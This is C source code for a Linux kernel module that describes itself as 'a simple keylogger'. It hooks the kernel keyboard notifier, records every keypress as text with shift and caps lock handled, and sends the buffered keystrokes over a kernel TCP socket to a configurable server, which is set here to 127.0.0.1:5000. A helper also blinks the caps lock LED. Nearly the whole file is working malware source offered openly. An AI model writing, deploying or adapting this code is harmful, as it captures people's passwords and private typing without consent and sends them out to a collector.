#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/input.h>
#include <linux/hid.h>
#include <linux/keyboard.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/bitmap.h>
#include <linux/delay.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 5000
#define BUFFER_SIZE 256
#define MAX_KEYCODE 255
#define CAPSLOCK_BRIGHTNESS_PATH "/sys/class/leds/input4::capslock/brightness" //change for your path

static DECLARE_BITMAP(key_states, MAX_KEYCODE + 1);

static const char *keymap[MAX_KEYCODE + 1] = {
    [KEY_A] = "a", [KEY_B] = "b", [KEY_C] = "c", [KEY_D] = "d",
    [KEY_E] = "e", [KEY_F] = "f", [KEY_G] = "g", [KEY_H] = "h",
    [KEY_I] = "i", [KEY_J] = "j", [KEY_K] = "k", [KEY_L] = "l",
    [KEY_M] = "m", [KEY_N] = "n", [KEY_O] = "o", [KEY_P] = "p",
    [KEY_Q] = "q", [KEY_R] = "r", [KEY_S] = "s", [KEY_T] = "t",
    [KEY_U] = "u", [KEY_V] = "v", [KEY_W] = "w", [KEY_X] = "x",
    [KEY_Y] = "y", [KEY_Z] = "z",
    [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3", [KEY_4] = "4",
    [KEY_5] = "5", [KEY_6] = "6", [KEY_7] = "7", [KEY_8] = "8",
    [KEY_9] = "9", [KEY_0] = "0",
    [KEY_SPACE] = "SPACE", [KEY_ENTER] = "ENTER", [KEY_ESC] = "ESC",
    [KEY_TAB] = "TAB", [KEY_LEFTSHIFT] = "LSHIFT", [KEY_RIGHTSHIFT] = "RSHIFT",
    [KEY_LEFTCTRL] = "LCTRL", [KEY_RIGHTCTRL] = "RCTRL",
    [KEY_LEFTALT] = "LALT", [KEY_RIGHTALT] = "RALT",
    [KEY_BACKSPACE] = "BACKSPACE", [KEY_CAPSLOCK] = "CAPSLOCK",
    [KEY_F1] = "F1", [KEY_F2] = "F2", [KEY_F3] = "F3", [KEY_F4] = "F4",
    [KEY_F5] = "F5", [KEY_F6] = "F6", [KEY_F7] = "F7", [KEY_F8] = "F8",
    [KEY_F9] = "F9", [KEY_F10] = "F10", [KEY_F11] = "F11", [KEY_F12] = "F12",
    [KEY_UP] = "UP", [KEY_DOWN] = "DOWN", [KEY_LEFT] = "LEFT", [KEY_RIGHT] = "RIGHT",
    [KEY_HOME] = "HOME", [KEY_END] = "END", [KEY_PAGEUP] = "PAGEUP", [KEY_PAGEDOWN] = "PAGEDOWN",
    [KEY_INSERT] = "INSERT", [KEY_DELETE] = "DELETE",
};

char message[BUFFER_SIZE];
static int message_len = 0;
static struct socket *sock;
static struct sockaddr_in s_addr;
short shift_pressed = 0;
short capslock_state = 0;

// Function to send data to the server
static int send_data_to_server(const char *data)
{
    struct kvec vec;
    struct msghdr msg;
    int ret;

    memset(&msg, 0, sizeof(msg));
    vec.iov_base = (void *)data;
    vec.iov_len = strlen(data);

    ret = kernel_sendmsg(sock, &msg, &vec, 1, strlen(data));
    if (ret < 0) {
        pr_err("Failed to send data: %d\n", ret);
    }

    return ret;
}

static void led_lights_flashing(void)
{
    struct file *file;
    loff_t pos = 0;
    char *buffer = "1";
    char *reset_buffer = "0";
    ssize_t bytes_written;
    for(int i = 0; i < 10; i++){

        // Open the file in write-only mode
        file = filp_open(CAPSLOCK_BRIGHTNESS_PATH, O_WRONLY, 0);
        if (IS_ERR(file)) {
            pr_err("Failed to open file for writing: %ld\n", PTR_ERR(file));
            return;
        }

        // Write "1" to the file
        bytes_written = kernel_write(file, buffer, 1, &pos);
        if (bytes_written < 0) {
            pr_err("Failed to write '1' to file: %ld\n", bytes_written);
        } else {
            pr_info("Successfully wrote '1' to file\n");
        }
        msleep(200);

        // Reset position for the next write
        pos = 0;

        // Write "0" to the file
        bytes_written = kernel_write(file, reset_buffer, 1, &pos);
        if (bytes_written < 0) {
            pr_err("Failed to write '0' to file: %ld\n", bytes_written);
        } else {
            pr_info("Successfully wrote '0' to file\n");
        }
        msleep(200);
    
        // Clean up
        filp_close(file, NULL);
    }
}

static int keyboard_event(struct notifier_block *nb, unsigned long code, void *param)
{
    struct keyboard_notifier_param *kp = param;
    
    if (kp->value == KEY_LEFTSHIFT || kp->value == KEY_RIGHTSHIFT) {
        shift_pressed = kp->down;  // Update shift state when the key is pressed or released
    }
    if(kp->value == KEY_CAPSLOCK){
        if (kp->down) {
        capslock_state = !capslock_state;  // Toggle on key press
        pr_info("Caps state: %d\n", capslock_state);
        }
    }

    if(kp->value == KEY_F1)
    {
        if (kp->down)
            led_lights_flashing();
    }
    
    
    if (kp->down && kp->value >= 0 && kp->value <= MAX_KEYCODE) {
        const char *key_char = keymap[kp->value];
        if (key_char) {
            int key_len = strlen(key_char) + 1;
            if (message_len + key_len > BUFFER_SIZE) {
                send_data_to_server(message);
                pr_info("Data sent to server: %s", message);
                memset(message, 0, BUFFER_SIZE);
                message_len = 0;
            }

            char display_char = key_char[0];
            if ((shift_pressed || capslock_state) && display_char >= 'a' && display_char <= 'z') {
                display_char = display_char - 'a' + 'A';  // Convert to uppercase
                snprintf(message + message_len, BUFFER_SIZE - message_len, " %c", display_char); // Append character
            
            }
            else{ //special string f.e. "SPACE"
                snprintf(message + message_len, BUFFER_SIZE - message_len, " %s", key_char); // Append string without spaces
            }
            message_len += strlen(message + message_len);
            pr_info("Data: %s, size: %d", message, message_len);
        }
    }

    return NOTIFY_OK;
}

static void get_capslock_state(void) {
    struct file *file;
    char *buffer;
    ssize_t bytes_read;

    // Allocate memory for buffer (2 bytes to store 1 character + null terminator)
    buffer = kmalloc(2, GFP_KERNEL);
    if (!buffer) {
        pr_err("Failed to allocate memory\n");
        return;
    }

    // Open the file in read-only mode
    file = filp_open(CAPSLOCK_BRIGHTNESS_PATH, O_RDONLY, 0);
    if (IS_ERR(file)) {
        pr_err("Failed to open file: %ld\n", PTR_ERR(file));
        kfree(buffer);
        return;
    }

    // Read one byte from the file
    bytes_read = kernel_read(file, buffer, 1, &file->f_pos);
    if (bytes_read < 0) {
        pr_err("Failed to read from file\n");
    } else {
        buffer[bytes_read] = '\0';  // Null-terminate the string
        pr_info("Read value from file: %s\n", buffer);

        if (buffer[0] == '1') {
            capslock_state = 1;  //ON
        } else if (buffer[0] == '0') {
            capslock_state = 0;  //OFF
        } else {
            pr_err("Invalid value read from file: %s\n", buffer);
            capslock_state = -1;  //error
        }
    }

    // Clean up
    filp_close(file, NULL);
    kfree(buffer);
}


static struct notifier_block keyboard_nb = {
    .notifier_call = keyboard_event
};

static int __init keyboard_macro_init(void)
{
    int ret;
    memset(message, 0, BUFFER_SIZE);

    ret = register_keyboard_notifier(&keyboard_nb);
    if (ret) {
        pr_err("Failed to register keyboard notifier\n");
        return ret;
    }

    // Set up socket
    memset(&s_addr, 0, sizeof(s_addr));
    s_addr.sin_family = AF_INET;
    s_addr.sin_port = htons(SERVER_PORT);
    s_addr.sin_addr.s_addr = in_aton(SERVER_IP);

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret) {
        pr_err("Failed to create socket\n");
        unregister_keyboard_notifier(&keyboard_nb);
        return ret;
    }

    ret = kernel_connect(sock, (struct sockaddr *)&s_addr, sizeof(s_addr), 0);
    if (ret) {
        pr_err("Failed to connect to server\n");
        sock_release(sock);
        unregister_keyboard_notifier(&keyboard_nb);
        return ret;
    }

    get_capslock_state();
    led_lights_flashing();

    pr_info("Keyboard module loaded\n");
    return 0;
}

static void __exit keyboard_macro_exit(void)
{
    unregister_keyboard_notifier(&keyboard_nb);
    if (sock)
        sock_release(sock);

    memset(message, 0, BUFFER_SIZE);
    pr_info("Keyboard module unloaded\n");
}

module_init(keyboard_macro_init);
module_exit(keyboard_macro_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A simple keylogger");
